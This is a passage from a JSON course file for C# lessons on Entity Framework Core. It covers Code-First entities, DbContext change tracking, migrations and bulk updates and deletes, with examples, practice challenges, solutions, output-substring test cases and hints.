3: Configure relationships (Fluent API)\n    protected override void OnModelCreating(ModelBuilder modelBuilder)\n    {\n        // Configure Customer\n        modelBuilder.Entity<Customer>()\n            .HasKey(c => c.Id);\n        \n        modelBuilder.Entity<Customer>()\n            .HasMany(c => c.Orders)  // Customer has many Orders\n            .WithOne(o => o.Customer)  // Each Order has one Customer\n            .HasForeignKey(o => o.CustomerId);\n        \n        // Seed data (initial data)\n        modelBuilder.Entity<Customer>().HasData(\n            new Customer { Id = 1, Name = \"John Doe\", Email = \"john@example.com\", Age = 30 }\n        );\n    }\n}\n\n// STEP 4: CREATE DATABASE\nusing var context = new StoreDbContext();  // Modern using declaration\ncontext.Database.EnsureDeleted();  // Delete if exists (learning only!)\ncontext.Database.EnsureCreated();  // Create from classes!\n\nConsole.WriteLine(\"Database created from C# classes!\");\nConsole.WriteLine(\"Tables: Customers, Orders\");\nConsole.WriteLine(\"Relationship: Customer 1-to-Many Orders\");\n// context disposed at end of scope",
              "language": "csharp"
            },
            {
              "type": "THEORY",
              "title": "Syntax Breakdown",
              "content": "## Breaking Down the Syntax\n\n**`Data Annotations`**: [Required], [MaxLength], [Column], [Key] - Attributes on properties configure database! [Required] = NOT NULL. [MaxLength(50)] = VARCHAR(50).\n\n**`Navigation properties`**: public List<Order> Orders - Represents relationship! Customer has many Orders. EF creates foreign key automatically.\n\n**`OnModelCreating()`**: Fluent API configuration. More powerful than attributes! Configure relationships, indexes, constraints. Override in DbContext.\n\n**`HasMany().WithOne()`**: Fluent API for 1-to-Many relationship. HasMany(c => c.Orders) on Customer. WithOne(o => o.Customer) on Order. Defines both sides!"
            }
          ],
          "challenges": [
            {
              "type": "FREE_CODING",
              "id": "lesson-12-04-challenge-01",
              "title": "Practice Challenge",
              "description": "Apply what you've learned in this interactive coding challenge.",
              "instructions": "Build a Blog database with Code-First!\n\n1. Create 'BlogPost' entity:\n   - int Id\n   - string Title ([Required], [MaxLength(200)])\n   - string Content ([Required])\n   - DateTime PublishedDate\n   - int AuthorId (foreign key)\n   - Author Author (navigation property)\n\n2. Create 'Author' entity:\n   - int Id\n   - string Name ([Required], [MaxLength(100)])\n   - string Email ([Required])\n   - List<BlogPost> BlogPosts (navigation property)\n\n3. Create 'BlogDbContext':\n   - DbSet<BlogPost> BlogPosts\n   - DbSet<Author> Authors\n   - Configure relationship in OnModelCreating:\n     - Author has many BlogPosts\n     - BlogPost has one Author\n   - Seed one author\n\n4. Print the schema that would be created:\n   - Table names\n   - Column names and types\n   - Relationships\n\nThis shows Code-First design!",
              "starterCode": "using Microsoft.EntityFrameworkCore;\nusing System;\nusing System.Collections.Generic;\nusing System.ComponentModel.DataAnnotations;\nusing System.ComponentModel.DataAnnotations.Schema;\n\nclass BlogPost\n{\n    public int Id { get; set; }\n    \n    [Required]\n    [MaxLength(200)]\n    public string Title { get; set; } = string.Empty;\n    \n    [Required]\n    public string Content { get; set; } = string.Empty;\n    \n    public DateTime PublishedDate { get; set; }\n    \n    public int AuthorId { get; set; }\n    public Author Author { get; set; } = null!;\n}\n\nclass Author\n{\n    public int Id { get; set; }\n    \n    [Required]\n    [MaxLength(100)]\n    public string Name { get; set; } = string.Empty;\n    \n    [Required]\n    public string Email { get; set; } = string.Empty;\n    \n    public List<BlogPost> BlogPosts { get; set; } = new();\n}\n\nclass BlogDbContext : DbContext\n{\n    public DbSet<BlogPost> BlogPosts { get; set; }\n    public DbSet<Author> Authors { get; set; }\n    \n    protected override void OnConfiguring(DbContextOptionsBuilder optionsBuilder)\n    {\n        optionsBuilder.UseSqlite(\"Data Source=blog.db\");\n    }\n    \n    protected override void OnModelCreating(ModelBuilder modelBuilder)\n    {\n        // Configure relationship\n        modelBuilder.Entity<Author>()\n            .HasMany(a => a.BlogPosts)\n            .WithOne(b => b.Author)\n            .HasForeignKey(b => b.AuthorId);\n        \n        // Seed data\n        modelBuilder.Entity<Author>().HasData(\n            new Author { Id = 1, Name = \"Jane Smith\", Email = \"jane@example.com\" }\n        );\n    }\n}\n\nConsole.WriteLine(\"=== CODE-FIRST DATABASE SCHEMA ===\");\nConsole.WriteLine(\"\\nTable: Authors\");\nConsole.WriteLine(\"  - Id (INT, PRIMARY KEY)\");\nConsole.WriteLine(\"  - Name (VARCHAR(100), NOT NULL)\");\nConsole.WriteLine(\"  - Email (VARCHAR, NOT NULL)\");\n\nConsole.WriteLine(\"\\nTable: BlogPosts\");\nConsole.WriteLine(\"  - Id (INT, PRIMARY KEY)\");\nConsole.WriteLine(\"  - Title (VARCHAR(200), NOT NULL)\");\nConsole.WriteLine(\"  - Content (TEXT, NOT NULL)\");\nConsole.WriteLine(\"  - PublishedDate (DATETIME)\");\nConsole.WriteLine(\"  - AuthorId (INT, FOREIGN KEY → Authors.Id)\");\n\nConsole.WriteLine(\"\\nRelationship:\");\nConsole.WriteLine(\"  Author 1-to-Many BlogPosts\");",
              "solution": "using Microsoft.EntityFrameworkCore;\nusing System;\nusing System.Collections.Generic;\nusing System.ComponentModel.DataAnnotations;\nusing System.ComponentModel.DataAnnotations.Schema;\n\nclass BlogPost\n{\n    public int Id { get; set; }\n    \n    [Required]\n    [MaxLength(200)]\n    public string Title { get; set; } = string.Empty;\n    \n    [Required]\n    public string Content { get; set; } = string.Empty;\n    \n    public DateTime PublishedDate { get; set; }\n    \n    public int AuthorId { get; set; }\n    public Author Author { get; set; } = null!;\n}\n\nclass Author\n{\n    public int Id { get; set; }\n    \n    [Required]\n    [MaxLength(100)]\n    public string Name { get; set; } = string.Empty;\n    \n    [Required]\n    public string Email { get; set; } = string.Empty;\n    \n    public List<BlogPost> BlogPosts { get; set; } = new();\n}\n\nclass BlogDbContext : DbContext\n{\n    public DbSet<BlogPost> BlogPosts { get; set; }\n    public DbSet<Author> Authors { get; set; }\n    \n    protected override void OnConfiguring(DbContextOptionsBuilder optionsBuilder)\n    {\n        optionsBuilder.UseSqlite(\"Data Source=blog.db\");\n    }\n    \n    protected override void OnModelCreating(ModelBuilder modelBuilder)\n    {\n        modelBuilder.Entity<Author>()\n            .HasMany(a => a.BlogPosts)\n            .WithOne(b => b.Author)\n            .HasForeignKey(b => b.AuthorId);\n        \n        modelBuilder.Entity<Author>().HasData(\n            new Author { Id = 1, Name = \"Jane Smith\", Email = \"jane@example.com\" }\n        );\n    }\n}\n\nConsole.WriteLine(\"=== CODE-FIRST DATABASE SCHEMA ===\");\nConsole.WriteLine(\"Database generated from C# classes!\\n\");\n\nConsole.WriteLine(\"Table: Authors\");\nConsole.WriteLine(\"  Columns:\");\nConsole.WriteLine(\"    - Id (INT, PRIMARY KEY, AUTO-INCREMENT)\");\nConsole.WriteLine(\"    - Name (VARCHAR(100), NOT NULL)\");\nConsole.WriteLine(\"    - Email (VARCHAR, NOT NULL)\");\n\nConsole.WriteLine(\"\\nTable: BlogPosts\");\nConsole.WriteLine(\"  Columns:\");\nConsole.WriteLine(\"    - Id (INT, PRIMARY KEY, AUTO-INCREMENT)\");\nConsole.WriteLine(\"    - Title (VARCHAR(200), NOT NULL)\");\nConsole.WriteLine(\"    - Content (TEXT, NOT NULL)\");\nConsole.WriteLine(\"    - PublishedDate (DATETIME)\");\nConsole.WriteLine(\"    - AuthorId (INT, FOREIGN KEY → Authors.Id)\");\n\nConsole.WriteLine(\"\\nRelationships:\");\nConsole.WriteLine(\"  ✓ Author HAS MANY BlogPosts (1-to-Many)\");\nConsole.WriteLine(\"  ✓ BlogPost BELONGS TO one Author\");\n\nConsole.WriteLine(\"\\nSeed Data:\");\nConsole.WriteLine(\"  ✓ Author: Jane Smith (jane@example.com)\");\n\nConsole.WriteLine(\"\\n=== BENEFITS OF CODE-FIRST ===\");\nConsole.WriteLine(\"✅ C# classes = Source of truth\");\nConsole.WriteLine(\"✅ Database auto-generated from classes\");\nConsole.WriteLine(\"✅ Refactor code → Database updates via migrations\");\nConsole.WriteLine(\"✅ Version control friendly (classes in Git!)\");",
              "language": "csharp",
              "testCases": [
                {
                  "id": "test-1",
                  "description": "Output should contain \"CODE-FIRST\"",
                  "expectedOutput": "CODE-FIRST",
                  "isVisible": true
                },
                {
                  "id": "test-2",
                  "description": "Output should contain \"Authors\"",
                  "expectedOutput": "Authors",
                  "isVisible": true
                },
                {
                  "id": "test-3",
                  "description": "Output should contain \"BlogPosts\"",
                  "expectedOutput": "BlogPosts",
                  "isVisible": true
                },
                {
                  "id": "test-4",
                  "description": "Output should contain \"Relationship\"",
                  "expectedOutput": "Relationship",
                  "isVisible": true
                },
                {
                  "id": "test-5",
                  "description": "Output should contain \"BENEFITS\"",
                  "expectedOutput": "BENEFITS",
                  "isVisible": true
                }
              ],
              "hints": [
                {
                  "level": 1,
                  "text": "Attributes: [Required], [MaxLength(n)]. Navigation: List<T> for many, single property for one. OnModelCreating: HasMany().WithOne().HasForeignKey(). HasData() seeds initial data."
                },
                {
                  "level": 2,
                  "text": "Missing null-forgiving operator: Navigation properties like 'public Author Author' need '= null!' in modern C#. Otherwise nullable warnings. Or make nullable: 'Author?'."
                },
                {
                  "level": 3,
                  "text": "Forgetting inverse navigation: Define BOTH sides of relationship! Customer has List<Order>, Order has Customer. EF uses both to create proper foreign key."
                },
                {
                  "level": 4,
                  "text": "Attributes vs Fluent API: Simple configs = attributes. Complex = Fluent API. Can mix both! Fluent API overrides attributes if both used."
                },
                {
                  "level": 5,
                  "text": "EnsureCreated limitations: Can't modify schema after creation! Use Migrations in real apps. EnsureCreated() is learning/testing only. No schema updates possible!"
                }
              ],
              "commonMistakes": [
                {
                  "mistake": "Missing null-forgiving operator",
                  "consequence": "Navigation properties like 'public Author Author' need '= null!' in modern C#. Otherwise nullable warnings. Or make nullable: 'Author?'.",
                  "correction": "Review the correct syntax and best practices for this concept."
                },
                {
                  "mistake": "Forgetting inverse navigation",
                  "consequence": "Define BOTH sides of relationship! Customer has List<Order>, Order has Customer. EF uses both to create proper foreign key.",
                  "correction": "Review the correct syntax and best practices for this concept."
                },
                {
                  "mistake": "Attributes vs Fluent API",
                  "consequence": "Simple configs = attributes. Complex = Fluent API. Can mix both! Fluent API overrides attributes if both used.",
                  "correction": "Review the correct syntax and best practices for this concept."
                },
                {
                  "mistake": "EnsureCreated() is a Schema Dead End",
                  "consequence": "Once you use EnsureCreated(), you're LOCKED to that schema! Adding new properties, changing types, or modifying relationships will be IGNORED. Your code and database will drift apart silently, causing runtime errors when properties don't match columns!",
                  "correction": "Use EF Core Migrations from day one in any project beyond tutorials: 'dotnet ef migrations add [Name]' creates versioned schema changes. Migrations can be applied, rolled back, and version-controlled. EnsureCreated() should only appear in learning exercises or unit test setup."
                }
              ],
              "difficulty": "advanced"
            }
          ]
        },
        {
          "id": "lesson-12-05",
          "title": "DbContext & DbSet (Your Database Connection)",
          "moduleId": "module-12",
          "order": 5,
          "estimatedMinutes": 15,
          "difficulty": "advanced",
          "contentSections": [
            {
              "type": "ANALOGY",
              "title": "Understanding the Concept",
              "content": "Imagine a library:\n\nLIBRARY BUILDING = DbContext\n• The entire library facility\n• Entry point to all resources\n• Handles check-in/check-out (SaveChanges)\n• Tracks what you borrowed (Change Tracking)\n\nBOOKSHELVES = DbSet<T>\n• Fiction shelf = DbSet<FictionBook>\n• Science shelf = DbSet<ScienceBook>\n• Each shelf (DbSet) contains books (entities) of one type\n\nDbContext responsibilities:\n• CONNECTION management\n• CHANGE TRACKING (remembers what you modified)\n• QUERY TRANSLATION (LINQ → SQL)\n• TRANSACTION management\n• CACHING (reduce database trips)\n\nDbSet<T> is a COLLECTION that:\n• Represents a table\n• Queryable with LINQ\n• Track additions/removals\n\nThink: DbContext = 'Your database session', DbSet = 'A specific table'!"
            },
            {
              "type": "EXAMPLE",
              "title": "Code Example",
              "content": "This example demonstrates the concepts in action.",
              "code": "using Microsoft.EntityFrameworkCore;\nusing System;\nusing System.Collections.Generic;\nusing System.Linq;\n\nclass Product\n{\n    public int Id { get; set; }\n    public string Name { get; set; } = string.Empty;\n    public decimal Price { get; set; }\n}\n\nclass AppDbContext : DbContext\n{\n    // DbSet = Table\n    public DbSet<Product> Products { get; set; }\n    \n    protected override void OnConfiguring(DbContextOptionsBuilder optionsBuilder)\n    {\n        optionsBuilder.UseSqlite(\"Data Source=app.db\");\n    }\n}\n\n// USING DbContext - Modern using declaration (C# 8+)\nusing var context = new AppDbContext();  // Disposed at end of scope\n\ncontext.Database.EnsureCreated();\n\n// CHANGE TRACKING\nvar product = new Product { Name = \"Laptop\", Price = 999.99m };\ncontext.Products.Add(product);  // Tracked as 'Added'\n\nConsole.WriteLine(\"State: \" + context.Entry(product).State);  // Added\n\ncontext.SaveChanges();  // Persist to database\nConsole.WriteLine(\"State: \" + context.Entry(product).State);  // Unchanged\n\n// QUERYING DbSet\nvar allProducts = context.Products.ToList();  // SELECT *\nvar expensive = context.Products\n    .Where(p => p.Price > 500)\n    .OrderBy(p => p.Name)\n    .ToList();  // SELECT ... WHERE ... ORDER BY\n\n// MODIFYING TRACKED ENTITY\nvar firstProduct = context.Products.First();\nfirstProduct.Price = 899.99m;  // EF tracks this change!\n\nConsole.WriteLine(\"Modified state: \" + context.Entry(firstProduct).State);\ncontext.SaveChanges();  // UPDATE\n\n// REMOVING\nvar toRemove = context.Products.Find(1);  // Find by primary key\nif (toRemove != null)\n{\n    context.Products.Remove(toRemove);  // Marked as Deleted\n    context.SaveChanges();  // DELETE\n}\n\n// DbContext TRACKING STATUS\nConsole.WriteLine(\"Total tracked: \" + context.ChangeTracker.Entries().Count());\n\n// context is DISPOSED at end of scope (connection closed)\n// 'using var' is the modern C# 8+ way - cleaner, same behavior!",
              "language": "csharp"
            },
            {
              "type": "THEORY",
              "title": "Syntax Breakdown",
              "content": "## Breaking Down the Syntax\n\n**`using var context = new DbContext();`**: Modern C# 8+ using declaration. DbContext implements IDisposable. The 'using var' ensures disposal at end of scope (closes connection, releases resources). Cleaner than the old braces style!\n\n**`context.Entry(entity).State`**: Check entity state: Unchanged, Added, Modified, Deleted, Detached. EF tracks state automatically when you modify objects!\n\n**`DbSet operations`**: Add(), Remove(), Find(key), ToList(), Where(), etc. DbSet implements IQueryable<T> - full LINQ support!\n\n**`context.SaveChanges()`**: Persists ALL tracked changes. Batches INSERT, UPDATE, DELETE into single transaction. Call once after all changes!"
            }
          ],
          "challenges": [
            {
              "type": "FREE_CODING",
              "id": "lesson-12-05-challenge-01",
              "title": "Practice Challenge",
              "description": "Apply what you've learned in this interactive coding challenge.",
              "instructions": "Demonstrate DbContext change tracking!\n\n1. Create 'Task' entity (Id, Title, IsCompleted)\n\n2. Create 'TaskDbContext' with DbSet<Task>\n\n3. Simulate change tracking states:\n   - Create new task, add to context\n   - Print state (should be 'Added')\n   - 'Save' and print state (now 'Unchanged')\n   - Modify task title\n   - Print state (now 'Modified')\n   - Mark for removal\n   - Print state (now 'Deleted')\n\n4. Show DbContext responsibilities:\n   - Print: Connection management\n   - Print: Change tracking\n   - Print: Query translation\n   - Print: Transaction management\n\n5. Emphasize 'using' statement importance!",
              "starterCode": "using Microsoft.EntityFrameworkCore;\nusing System;\nusing System.Linq;\n\nclass TaskItem\n{\n    public int Id { get; set; }\n    public string Title { get; set; } = string.Empty;\n    public bool IsCompleted { get; set; }\n}\n\nclass TaskDbContext : DbContext\n{\n    public DbSet<TaskItem> Tasks { get; set; }\n    \n    protected override void OnConfiguring(DbContextOptionsBuilder optionsBuilder)\n    {\n        optionsBuilder.UseSqlite(\"Data Source=tasks.db\");\n    }\n}\n\nConsole.WriteLine(\"=== DbContext CHANGE TRACKING DEMO ===\");\n\n// Simulate tracking\nvar task = new TaskItem { Title = \"Learn EF Core\", IsCompleted = false };\n\nConsole.WriteLine(\"\\n[1] NEW TASK CREATED\");\nConsole.WriteLine(\"Task object created in memory\");\nConsole.WriteLine(\"State: Not tracked (Detached)\");\n\nConsole.WriteLine(\"\\n[2] ADDED TO DbContext\");\nConsole.WriteLine(\"context.Tasks.Add(task)\");\nConsole.WriteLine(\"State: Added (will INSERT on SaveChanges)\");\n\nConsole.WriteLine(\"\\n[3] SAVED TO DATABASE\");\nConsole.WriteLine(\"context.SaveChanges()\");\nConsole.WriteLine(\"State: Unchanged (in sync with database)\");\n\nConsole.WriteLine(\"\\n[4] MODIFIED\");\nConsole.WriteLine(\"task.Title = 'Master EF Core'\");\nConsole.WriteLine(\"State: Modified (will UPDATE on SaveChanges)\");\n\nConsole.WriteLine(\"\\n[5] MARKED FOR DELETION\");\nConsole.WriteLine(\"context.Tasks.Remove(task)\");\nConsole.WriteLine(\"State: Deleted (will DELETE on SaveChanges)\");\n\nConsole.WriteLine(\"\\n=== DbContext RESPONSIBILITIES ===\");\nConsole.WriteLine(\"✓ Connection Management: Opens/closes database connection\");\nConsole.WriteLine(\"✓ Change Tracking: Remembers Added/Modified/Deleted\");\nConsole.WriteLine(\"✓ Query Translation: Converts LINQ to SQL\");\nConsole.WriteLine(\"✓ Transaction: SaveChanges() is atomic (all-or-nothing)\");\n\nConsole.WriteLine(\"\\n⚠️  IMPORTANT: Always use 'using' with DbContext!\");\nConsole.WriteLine(\"   using var context = new DbContext();  // Modern C# 8+ syntax\");",
              "solution": "using Microsoft.EntityFrameworkCore;\nusing System;\nusing System.Linq;\n\nclass TaskItem\n{\n    public int Id { get; set; }\n    public string Title { get; set; } = string.Empty;\n    public bool IsCompleted { get; set; }\n}\n\nclass TaskDbContext : DbContext\n{\n    public DbSet<TaskItem> Tasks { get; set; }\n    \n    protected override void OnConfiguring(DbContextOptionsBuilder optionsBuilder)\n    {\n        optionsBuilder.UseSqlite(\"Data Source=tasks.db\");\n    }\n}\n\nConsole.WriteLine(\"=== DbContext CHANGE TRACKING DEMONSTRATION ===\");\nConsole.WriteLine(\"Showing how EF Core tracks entity states\\n\");\n\nvar task = new TaskItem { Title = \"Learn EF Core\", IsCompleted = false };\n\nConsole.WriteLine(\"[1] NEW TASK CREATED\");\nConsole.WriteLine(\"    var task = new TaskItem { Title = 'Learn EF Core' };\");\nConsole.WriteLine(\"    State: Detached (not tracked by DbContext)\");\nConsole.WriteLine(\"    Database: No changes yet\\n\");\n\nConsole.WriteLine(\"[2] ADDED TO DbContext\");\nConsole.WriteLine(\"    context.Tasks.Add(task);\");\nConsole.WriteLine(\"    State: Added\");\nConsole.WriteLine(\"    Database: Will INSERT on SaveChanges()\\n\");\n\nConsole.WriteLine(\"[3] SAVED TO DATABASE\");\nConsole.WriteLine(\"    context.SaveChanges();\");\nConsole.WriteLine(\"    State: Unchanged\");\nConsole.WriteLine(\"    Database: Row inserted, EF in sync\\n\");\n\nConsole.WriteLine(\"[4] PROPERTY MODIFIED\");\nConsole.WriteLine(\"    task.Title = 'Master EF Core';\");\nConsole.WriteLine(\"    State: Modified (EF detected the change!)\");\nConsole.WriteLine(\"    Database: Will UPDATE on SaveChanges()\\n\");\n\nConsole.WriteLine(\"[5] MARKED FOR DELETION\");\nConsole.WriteLine(\"    context.Tasks.Remove(task);\");\nConsole.WriteLine(\"    State: Deleted\");\nConsole.WriteLine(\"    Database: Will DELETE on SaveChanges()\\n\");\n\nConsole.WriteLine(\"=== DbContext RESPONSIBILITIES ===\");\nConsole.WriteLine(\"✓ Connection Management:\");\nConsole.WriteLine(\"    Opens connection when needed, closes on Dispose\");\nConsole.WriteLine(\"\\n✓ Change Tracking:\");\nConsole.WriteLine(\"    Tracks: Unchanged, Added, Modified, Deleted states\");\nConsole.WriteLine(\"    Automatically detects property changes!\");\nConsole.WriteLine(\"\\n✓ Query Translation:\");\nConsole.WriteLine(\"    LINQ: context.Tasks.Where(t => t.IsCompleted)\");\nConsole.WriteLine(\"    SQL:  SELECT * FROM Tasks WHERE IsCompleted = 1\");\nConsole.WriteLine(\"\\n✓ Transaction Management:\");\nConsole.WriteLine(\"    SaveChanges() wraps in transaction (atomic!)\");\nConsole.WriteLine(\"    All changes succeed OR all fail (consistency!)\\n\");\n\nConsole.WriteLine(\"=== CRITICAL: Always Dispose! ===\");\nConsole.WriteLine(\"✓ MODERN:  using var context = new DbContext();  // C# 8+\");\nConsole.WriteLine(\"✓ CLASSIC: using (var context = new DbContext()) { ... }\");\nConsole.WriteLine(\"✗ WRONG:   var context = new DbContext(); (never disposed!)\");\nConsole.WriteLine(\"\\nWithout dispose: Connection leaks, memory leaks, locks!\");",
              "language": "csharp",
              "testCases": [
                {
                  "id": "test-1",
                  "description": "Output should contain \"CHANGE TRACKING\"",
                  "expectedOutput": "CHANGE TRACKING",
                  "isVisible": true
                },
                {
                  "id": "test-2",
                  "description": "Output should contain \"Added\"",
                  "expectedOutput": "Added",
                  "isVisible": true
                },
                {
                  "id": "test-3",
                  "description": "Output should contain \"Modified\"",
                  "expectedOutput": "Modified",
                  "isVisible": true
                },
                {
                  "id": "test-4",
                  "description": "Output should contain \"Deleted\"",
                  "expectedOutput": "Deleted",
                  "isVisible": true
                },
                {
                  "id": "test-5",
                  "description": "Output should contain \"RESPONSIBILITIES\"",
                  "expectedOutput": "RESPONSIBILITIES",
                  "isVisible": true
                },
                {
                  "id": "test-6",
                  "description": "Output should contain \"Dispose\"",
                  "expectedOutput": "Dispose",
                  "isVisible": true
                }
              ],
              "hints": [
                {
                  "level": 1,
                  "text": "DbContext: session with database. DbSet<T>: represents table. Change tracking: Added, Modified, Deleted, Unchanged. SaveChanges(): persists all. Always use 'using' statement!"
                },
                {
                  "level": 2,
                  "text": "Not disposing DbContext: Leads to connection leaks! Always use 'using' statement or manually call Dispose(). DbContext is meant for SHORT-LIVED use."
                },
                {
                  "level": 3,
                  "text": "Long-lived DbContext: Don't keep DbContext alive for entire app! Create per request (web) or per operation. Change tracking gets stale, memory grows."
                },
                {
                  "level": 4,
                  "text": "Detached entities: Entities not tracked by context = Detached. Can't SaveChanges() on detached! Must Add() or Attach() first."
                },
                {
                  "level": 5,
                  "text": "Multiple SaveChanges: SaveChanges() can be called multiple times, but creates multiple transactions. Batch changes, call SaveChanges() ONCE at end!"
                }
              ],
              "commonMistakes": [
                {
                  "mistake": "Not disposing DbContext",
                  "consequence": "Leads to connection leaks! Always use 'using' statement or manually call Dispose(). DbContext is meant for SHORT-LIVED use.",
                  "correction": "Review the correct syntax and best practices for this concept."
                },
                {
                  "mistake": "Long-lived DbContext",
                  "consequence": "Don't keep DbContext alive for entire app! Create per request (web) or per operation. Change tracking gets stale, memory grows.",
                  "correction": "Review the correct syntax and best practices for this concept."
                },
                {
                  "mistake": "Detached entities",
                  "consequence": "Entities not tracked by context = Detached. Can't SaveChanges() on detached! Must Add() or Attach() first.",
                  "correction": "Review the correct syntax and best practices for this concept."
                },
                {
                  "mistake": "Multiple SaveChanges",
                  "consequence": "SaveChanges() can be called multiple times, but creates multiple transactions. Batch changes, call SaveChanges() ONCE at end!",
                  "correction": "Review the correct syntax and best practices for this concept."
                }
              ],
              "difficulty": "advanced"
            }
          ]
        },
        {
          "id": "lesson-12-06",
          "title": "Migrations & Bulk Operations",
          "moduleId": "module-12",
          "order": 6,
          "estimatedMinutes": 15,
          "difficulty": "advanced",
          "contentSections": [
            {
              "type": "ANALOGY",
              "title": "Understanding the Concept",
              "content": "MIGRATIONS = Version control for your database schema!\n\nImagine building a house:\n• Version 1: Foundation only\n• Version 2: Add walls\n• Version 3: Add roof\n• Version 4: Add windows\n\nEach step is a MIGRATION:\n• Records what changed\n• Can go forward (apply) or backward (rollback)\n• Track schema evolution in code!\n\nBULK OPERATIONS (NEW in EF Core 7/8):\nOLD way (slow):\n```csharp\nforeach (var product in products)\n{\n    product.Price *= 1.1;  // 10% increase\n}\ncontext.SaveChanges();  // Loads each, updates each - SLOW!\n```\n\nNEW way (fast):\n```csharp\ncontext.Products\n    .Where(p => p.Category == \"Electronics\")\n    .ExecuteUpdate(p => p.SetProperty(x => x.Price, x => x.Price * 1.1));\n// Single UPDATE statement - FAST!\n```\n\nThink: Migrations = 'Git for database schema', Bulk = 'Update 1000 rows in one SQL statement!'"
            },
            {
              "type": "EXAMPLE",
              "title": "Code Example",
              "content": "This example demonstrates the concepts in action.",
              "code": "using Microsoft.EntityFrameworkCore;\nusing System;\nusing System.Linq;\n\n// MIGRATIONS (Commands)\n// dotnet ef migrations add InitialCreate\n// dotnet ef database update\n// dotnet ef migrations add AddPriceColumn\n// dotnet ef database update\n\nclass Product\n{\n    public int Id { get; set; }\n    public string Name { get; set; } = string.Empty;\n    public decimal Price { get; set; }\n    public string Category { get; set; } = string.Empty;\n}\n\nclass AppDbContext : DbContext\n{\n    public DbSet<Product> Products { get; set; }\n    \n    protected override void OnConfiguring(DbContextOptionsBuilder optionsBuilder)\n    {\n        optionsBuilder.UseSqlite(\"Data Source=app.db\");\n    }\n}\n\nusing var context = new AppDbContext();  // Modern using declaration\n\ncontext.Database.EnsureCreated();\n\n// Seed data\nif (!context.Products.Any())\n{\n    context.Products.AddRange(\n        new Product { Name = \"Laptop\", Price = 1000, Category = \"Electronics\" },\n        new Product { Name = \"Mouse\", Price = 30, Category = \"Electronics\" },\n        new Product { Name = \"Desk\", Price = 200, Category = \"Furniture\" }\n    );\n    context.SaveChanges();\n}\n\n// BULK UPDATE (EF Core 7+)\nConsole.WriteLine(\"=== BULK UPDATE ===\");\nint updated = context.Products\n    .Where(p => p.Category == \"Electronics\")\n    .ExecuteUpdate(setters => setters\n        .SetProperty(p => p.Price, p => p.Price * 1.1m));\n\nConsole.WriteLine($\"Updated {updated} products with single SQL!\");\n// Generated SQL: UPDATE Products SET Price = Price * 1.1 WHERE Category = 'Electronics'\n\n// BULK DELETE (EF Core 7+)\nConsole.WriteLine(\"\\n=== BULK DELETE ===\");\nint deleted = context.Products\n    .Where(p => p.Price < 50)\n    .ExecuteDelete();\n\nConsole.WriteLine($\"Deleted {deleted} products\");\n// Generated SQL: DELETE FROM Products WHERE Price < 50\n\n// TRADITIONAL UPDATE (for comparison - slower!)\nvar products = context.Products.Where(p => p.Category == \"Furniture\").ToList();\nforeach (var p in products)\n{\n    p.Price *= 1.05m;  // 5% increase\n}\ncontext.SaveChanges();  // Separate UPDATE for each!\n// context disposed at end of scope\n\n// MIGRATION WORKFLOW:\n// 1. Change your entity classes (add/remove properties)\n// 2. Run: dotnet ef migrations add DescriptiveName\n// 3. Review generated migration code\n// 4. Run: dotnet ef database update\n// 5. Database schema updated!\n\n// MIGRATION COMMANDS:\n// List migrations: dotnet ef migrations list\n// Remove last:     dotnet ef migrations remove\n// Rollback:        dotnet ef database update PreviousMigration\n// Generate SQL:    dotnet ef migrations script",
              "language": "csharp"
            },
            {
              "type": "THEORY",
              "title": "Syntax Breakdown",
              "content": "## Breaking Down the Syntax\n\n**`ExecuteUpdate()`**: EF Core 7+ feature. Updates multiple rows with single SQL! SetProperty(prop, value). Returns number of affected rows. WAY faster than load-modify-save!\n\n**`ExecuteDelete()`**: EF Core 7+ feature. Deletes multiple rows with single SQL! No loading into memory. Executes immediately (not on SaveChanges!).\n\n**`Migrations add`**: dotnet ef migrations add Name - Creates migration file with Up() and Down() methods. Snapshot of schema changes.\n\n**`database update`**: dotnet ef database update - Applies pending migrations to database. Updates schema to match code!"
            }
          ],
          "challenges": [
            {
              "type": "FREE_CODING",
              "id": "lesson-12-06-challenge-01",
              "title": "Practice Challenge",
              "description": "Apply what you've learned in this interactive coding challenge.",
              "instructions": "Demonstrate migrations and bulk operations!\n\n1. Create 'Employee' entity:\n   - int Id\n   - string Name\n   - decimal Salary\n   - string Department\n\n2. Create 'CompanyDbContext'\n\n3. Show migration workflow (print commands):\n   - Print: dotnet ef migrations add InitialCreate\n   - Print: dotnet ef database update\n   - Print: (Add new property 'bool IsActive')\n   - Print: dotnet ef migrations add AddIsActive\n   - Print: dotnet ef database update\n\n4. Simulate bulk operations:\n   - BULK UPDATE: Give 10% raise to 'Engineering' department\n   - Print SQL that would execute\n   - BULK DELETE: Remove employees with salary < 30000\n   - Print SQL that would execute\n\n5. Compare with traditional approach:\n   - Show foreach loop version (slow)\n   - Show bulk version (fast)\n   - Explain performance difference",
              "starterCode": "using Microsoft.EntityFrameworkCore;\nusing System;\nusing System.Linq;\n\nclass Employee\n{\n    public int Id { get; set; }\n    public string Name { get; set; } = string.Empty;\n    public decimal Salary { get; set; }\n    public string Department { get; set; } = string.Empty;\n}\n\nclass CompanyDbContext : DbContext\n{\n    public DbSet<Employee> Employees { get; set; }\n    \n    protected override void OnConfiguring(DbContextOptionsBuilder optionsBuilder)\n    {\n        optionsBuilder.UseSqlite(\"Data Source=company.db\");\n    }\n}\n\nConsole.WriteLine(\"=== MIGRATIONS WORKFLOW ===\");\nConsole.WriteLine(\"\\n1. Create initial entities and DbContext\");\nConsole.WriteLine(\"   Command: dotnet ef migrations add InitialCreate\");\nConsole.WriteLine(\"   Result: Creates Migrations/InitialCreate.cs\");\n\nConsole.WriteLine(\"\\n2. Apply migration to database\");\nConsole.WriteLine(\"   Command: dotnet ef database update\");\nConsole.WriteLine(\"   Result: Database created with Employees table\");\n\nConsole.WriteLine(\"\\n3. Add new property to Employee class\");\nConsole.WriteLine(\"   Code: public bool IsActive { get; set; }\");\n\nConsole.WriteLine(\"\\n4. Create migration for new property\");\nConsole.WriteLine(\"   Command: dotnet ef migrations add AddIsActive\");\nConsole.WriteLine(\"   Result: Migration file for schema change\");\n\nConsole.WriteLine(\"\\n5. Apply the migration\");\nConsole.WriteLine(\"   Command: dotnet ef database update\");\nConsole.WriteLine(\"   Result: IsActive column added to Employees table\");\n\nConsole.WriteLine(\"\\n=== BULK OPERATIONS (EF Core 7+) ===\");\n\nConsole.WriteLine(\"\\nBULK UPDATE: 10% raise for Engineering\");\nConsole.WriteLine(\"Code:\");\nConsole.WriteLine(\"  context.Employees\");\nConsole.WriteLine(\"    .Where(e => e.Department == 'Engineering')\");\nConsole.WriteLine(\"    .ExecuteUpdate(s => 